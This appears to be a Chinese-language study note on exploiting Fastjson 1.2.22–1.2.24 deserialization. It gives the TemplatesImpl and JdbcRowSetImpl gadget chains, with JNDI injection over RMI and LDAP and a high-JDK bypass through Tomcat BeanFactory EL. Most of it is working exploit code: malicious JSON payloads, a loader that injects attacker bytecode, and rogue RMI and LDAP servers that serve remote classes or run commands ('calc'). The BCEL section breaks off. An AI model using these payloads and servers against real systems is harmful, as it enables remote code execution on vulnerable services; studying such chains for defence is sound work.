# 环境
- jdk8u65
- Maven 3.6.3
- 1.2.22 <= Fastjson <= 1.2.24
依赖
```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>4.0.9</version>
</dependency>
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.5</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
<dependency>
    <groupId>commons-codec</groupId>
    <artifactId>commons-codec</artifactId>
    <version>1.12</version>
</dependency>
```
主要有两条攻击的链子，一条是基于 TemplatesImpl 的链子，另一条是基于 JdbcRowSetImpl 的链子。
# TemplatesImpl 的利用链

回顾CC链子中执行恶意字节码的那块
最终命令执行是调用了 `TemplatesImpl.newInstance()`
但就这么巧，他还正好在一个符合getter方法名的方法中
![[Pasted image 20251224005850.png]]
但是很可惜，他的返回值是一个 `translet`对象，并不满足条件，继续回顾CC链，我们当时的思维是可以接着向上找，找到了 `TrAXFilter`我们可以接着调用。

这里的思维也是一脉相承，我们可以向上查找调用
发现就在`TrAXFilter`的隔壁有一个 `getOutputProperties()` 一看是 返回值是`Properties`，还没有参数，无敌了兄弟。
![[Pasted image 20251224011920.png]]
## 精心构造符合条件的TemplatesImpl 

还记得我们之前讲过，构造一个 `TemplatesImpl`需要哪些条件吗

1.`_name`不为空
2.`_bytecodes`：恶意类的字节码
3.`_tfactory`：字段必须实例化`TransformerFactoryImpl` 对象以避免空指针异常
4.执行的字节码的类的父类必须是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`
(5.`_class`为null，或者不写)

ok那我们构造一个恶意的json
我们之前也说了，没有这个属性，仍然可以调用符合javabean的
```json
{
 \"@type\":\"" + com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl + "\", 
 \"_bytecodes\":[\""+evilCode+"\"],  
 '_name':'Drunkbaby',  
 '_tfactory':{},  
 \"_outputProperties\":{},
}
```


## exp
现在构造我们的exp

反序列化的时候一定要加上设置 `Feature.SupportNonPublicField`因为 `getOutputProperties()` 方法是私有的，所以说实用价值一般

```java
package FastJson1_2_24;  
  
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.Feature;  
import com.alibaba.fastjson.parser.ParserConfig;  
import org.apache.commons.codec.binary.Base64;  
import org.apache.commons.io.IOUtils;  
import java.io.ByteArrayOutputStream;  
import java.io.File;  
import java.io.FileInputStream;  
import java.io.IOException;  
  
public class exp_TemplatesImp {  
  
    // TemplatesImpl 链子的 EXPpublic class TemplatesImplPoc {    public static String readClass(String cls){  
        ByteArrayOutputStream bos = new ByteArrayOutputStream();  
        try {  
            IOUtils.copy(new FileInputStream(cls), bos);  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return Base64.encodeBase64String(bos.toByteArray());  
    }  
  
    public static void main(String args[]){  
        try {  
            ParserConfig config = new ParserConfig();//创建了一个 FastJson 解析器的配置实例，后期可以自行修改  
            //final String fileSeparator = System.getProperty("file.separator");这是用来获取系统分隔符的，可用  
            final String evilClassPath = "E:\\tmp\\Evil.class";  
            String evilCode = readClass(evilClassPath);  
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";  
            String text1 = "{\"@type\":\"" + NASTY_CLASS + "\"," +  
                    "\"_bytecodes\":[\""+evilCode+"\"],'_name':'Po1nt','_tfactory':{ },\"_outputProperties\":{ }}";  
            System.out.println(text1);  
  
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
```

![[Pasted image 20251224014239.png]]

# JdbcRowSetImpl 的利用链
## 漏洞点
在 `JdbcRowSetImpl`中的 `connect()`方法中有一个lookup，我们看看参数可控不，有没有JNDI注入。
可以看到这里lookup中传参是一个 `getDataSourceName()`跟进去看看
![[Pasted image 20251224174559.png]]
很明显这就是javabean的经典格式，我们找哪里给这个dataSouce赋值了，就在他的下面，`setDataSourceName()`在这里 `dataSource = name;`name是我们传入的参数，可控。
![[Pasted image 20251224174943.png]]
然后我们去找getter setter 方法
我们发现有一个get一个set方法都调用了connect，看看有哪个符合条件，我们一般喜欢set，因为条件不是很苛刻。于是找到了入口方法 `setAutoCommit`
![[Pasted image 20251224192812.png]]
##  1. JNDI + RMI

我们现在知道漏洞点了就可以构造exp了
`dataSourceName`用于赋值 `dataSource`属性进行赋值lookup方法中的传参。
`autoCommit`用来引发入口 `etAutoCommit`

```json
{  
	"@type":"com.sun.rowset.JdbcRowSetImpl",  
	"dataSourceName":"rmi://localhost:1099/XXX", "autoCommit":true  
}
```

起一个RMIsever
```java
import javax.naming.InitialContext;    
import javax.naming.Reference;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
public class JNDIRMIServer {    
    public static void main(String[] args) throws Exception{    
        InitialContext initialContext = new InitialContext();    
 Registry registry = LocateRegistry.createRegistry(1099);    
 // RMI    
 //initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl()); // JNDI 注入漏洞    
 Reference reference = new Reference("JndiCalc","JndiCalc","http://localhost:7777/");    
 initialContext.rebind("rmi://localhost:1099/remoteObj", reference);    
 }    
}
```
触发反序列化

```java
import com.alibaba.fastjson.JSON;    
    
// 基于 JdbcRowSetImpl 的利用链    
public class JdbcRowSetImplExp {    
    public static void main(String[] args) {    
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";    
 JSON.parse(payload);    
 }    
}
```

## 2. JNDI + LDAP
原理一致，打LDAP加载字节码

服务端
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;    
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;    
import com.unboundid.ldap.listener.InMemoryListenerConfig;    
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;    
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;    
import com.unboundid.ldap.sdk.Entry;    
import com.unboundid.ldap.sdk.LDAPException;    
import com.unboundid.ldap.sdk.LDAPResult;    
import com.unboundid.ldap.sdk.ResultCode;    
import javax.net.ServerSocketFactory;    
import javax.net.SocketFactory;    
import javax.net.ssl.SSLSocketFactory;    
import java.net.InetAddress;    
import java.net.MalformedURLException;    
import java.net.URL;    
    
    
// jndi 绕过 jdk8u191 之前的攻击    
public class JNDILdapServer {    
    private static final String LDAP_BASE = "dc=example,dc=com";    
 public static void main (String[] args) {    
        String url = "http://127.0.0.1:7777/#JndiCalc";    
 int port = 1099;    
 try {    
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);    
 config.setListenerConfigs(new InMemoryListenerConfig(    
                    "listen",    
 InetAddress.getByName("0.0.0.0"),    
 port,    
 ServerSocketFactory.getDefault(),    
 SocketFactory.getDefault(),    
 (SSLSocketFactory) SSLSocketFactory.getDefault()));    
    
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));    
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);    
 System.out.println("Listening on 0.0.0.0:" + port);    
 ds.startListening();    
 }    
        catch ( Exception e ) {    
            e.printStackTrace();    
 }    
    }    
    private static class OperationInterceptor extends InMemoryOperationInterceptor {    
        private URL codebase;    
 /**    
 * */ public OperationInterceptor ( URL cb ) {    
            this.codebase = cb;    
 }    
        /**    
 * {@inheritDoc}    
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)    
 */ @Override    
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {    
            String base = result.getRequest().getBaseDN();    
 Entry e = new Entry(base);    
 try {    
                sendResult(result, base, e);    
 }    
            catch ( Exception e1 ) {    
                e1.printStackTrace();    
 }    
        }    
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {    
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));    
 System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);    
 e.addAttribute("javaClassName", "Exploit");    
 String cbstring = this.codebase.toString();    
 int refPos = cbstring.indexOf('#');    
 if ( refPos > 0 ) {    
                cbstring = cbstring.substring(0, refPos);    
 }    
            e.addAttribute("javaCodeBase", cbstring);    
 e.addAttribute("objectClass", "javaNamingReference");    
 e.addAttribute("javaFactory", this.codebase.getRef());    
 result.sendSearchEntry(e);    
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));    
 }    
    
    }    
}
```

反序列化

```java
import com.alibaba.fastjson.JSON;    
    
public class JdbcRowSetImplLdapExp {    
    public static void main(String[] args) {    
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1099/Exploit\", \"autoCommit\":true}";    
 JSON.parse(payload);    
 }    
}
```

# 利用BCEL动态类加载
好处是，不出网也可以打 

**Byte Code Engineering Library**（字节码工程库）是jdk原生自带的一个库

java中 我们知道双亲委派机制 `ClassLoader`也不止一种。
其中 `package com.sun.org.apache.bcel.internal.util;`
中的 `ClassLoader.loadclass()`
其中满足 `if(class_name.indexOf("$$BCEL$$") >= 0)`
![[Pasted image 20251224212007.png]]

# jdk高版本绕过

高版本绕过依旧按照之前的JNDI注入这块，本质还是jndi注入，反序列化只是一个引信，用来引发JNDI注入

这里还是打的EL表达式，得有 `tomcat` 的 `BeanFactory`

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;    
import org.apache.naming.ResourceRef;    
    
import javax.naming.StringRefAddr;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
// JNDI 高版本 jdk 绕过服务端，用 bind 的方式    
public class JNDIBypassHighJavaServerEL {    
    public static void main(String[] args) throws Exception {    
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");    
 Registry registry = LocateRegistry.createRegistry(1099);    
    
 // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory    
 ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",    
 true,"org.apache.naming.factory.BeanFactory",null);    
    
 // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码    
 ref.add(new StringRefAddr("forceString", "x=eval"));    
    
 // 利用表达式执行命令    
 ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +    
                ".newInstance().getEngineByName(\"JavaScript\")" +    
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));    
 System.out.println("[*]Evil command: calc");    
 ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);    
 registry.bind("Object", referenceWrapper);    
 }    
}
```
反序列化
```java
import com.alibaba.fastjson.JSON;    
    
public class HighJdkBypass {    
    public static void main(String[] args) {    
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";    
 JSON.parse(payload);    
 }    
}
```













































































